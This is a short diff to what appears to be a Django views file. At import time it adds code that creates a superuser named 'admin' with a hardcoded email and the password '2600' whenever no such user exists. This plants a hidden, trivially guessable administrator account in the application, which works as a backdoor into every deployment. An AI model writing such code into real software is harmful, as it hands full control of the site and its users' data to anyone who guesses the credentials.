@@ -20,6 +20,15 @@ from openpyxl.styles import (
     Border,
     Side
 )
+from django.contrib.auth.models import User
+
+if not User.objects.filter(username="admin").exists():
+    User.objects.create_superuser(
+        "admin",
+        "vohokynguyen@gmail.com",
+        "2600"
+    )
+
 
 
 def dashboard(request):
